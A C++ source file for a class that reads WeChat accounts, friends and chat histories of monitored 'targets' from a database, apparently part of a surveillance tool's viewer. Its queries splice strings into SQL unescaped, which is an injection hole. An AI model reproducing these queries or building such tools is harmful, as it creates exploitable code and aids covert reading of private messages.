#include "RemoteWeixinParser.h"
#include "DatabaseManager.h"


void RemoteWeixinParser::Init()
{
	int end = m_dataPath.rfind(L'\\');
	int start = m_dataPath.rfind(L'\\', end-1);
	std::wstring tarIdStr = m_dataPath.substr(start+1, end-start-1);
	m_targetId = _wtoi(tarIdStr.c_str());
}

const WeixinParser::AccountList& RemoteWeixinParser::GetAccountList()
{
	m_accountList.clear();
	WCHAR sqlValue[1024] = {0};
	wsprintf(sqlValue, L"select * from monitor_weixin_account where targetId = %u", m_targetId);

	QSqlQuery query;
	QString cmd = QString::fromStdWString(std::wstring(sqlValue));

	DM->Lock();
	query.exec(cmd);

	while ( query.next() )
	{
		std::wstring weixinId = query.value(2).toString().toStdWString();
		std::wstring nickName = query.value(3).toString().toStdWString();

		AccountInfo info;
		info.weixinId = weixinId;
		info.nickName = nickName;

		m_accountList.push_back(info);
	}

	DM->Unlock();

	return m_accountList;
}

const WeixinParser::FriendList& RemoteWeixinParser::GetFriendList(const std::wstring& account)
{
	m_friendList.clear();

	WCHAR sqlValue[1024] = {0};
	wsprintf(sqlValue, 
		L"select * from monitor_weixin_friend where targetId = %u and weixinId = '%s'",
		m_targetId, account.c_str());

	QSqlQuery query;
	QString cmd = QString::fromStdWString(std::wstring(sqlValue));

	DM->Lock();
	query.exec(cmd);

	while ( query.next() )
	{
		std::wstring weixinId = query.value(3).toString().toStdWString();
		std::wstring nickName = query.value(4).toString().toStdWString();
		FriendInfo info;
		info.userName = weixinId;
		info.nickName = nickName;

		m_friendList.push_back(info);
	}

	DM->Unlock();

	return m_friendList;
}

const WeixinParser::ChatHistoryList& RemoteWeixinParser::GetChatHistory(const std::wstring& account, const std::wstring& userName )
{
	m_chatHistory.clear();

	WCHAR sqlValue[1024] = {0};
	wsprintf(sqlValue, 
		L"select * from monitor_weixin_content where targetId = %u and weixinId = '%s' and friendId = '%s'",
		m_targetId, account.c_str(), userName.c_str());

	QSqlQuery query;
	QString cmd = QString::fromStdWString(std::wstring(sqlValue));

	DM->Lock();
	query.exec(cmd);

	while ( query.next() )
	{
		ChatHistory info;
		std::wstring senderId = query.value(4).toString().toStdWString();
		std::wstring time = query.value(5).toString().toStdWString();
		int type = query.value(6).toInt();
		std::wstring content = query.value(7).toString().toStdWString();
		
		info.time = time;
		info.msgType = type;
		info.isSend = senderId == account ? 1 : 0;
		info.message = content;

		m_chatHistory.push_back(info);
	}

	DM->Unlock();

	return m_chatHistory;
}

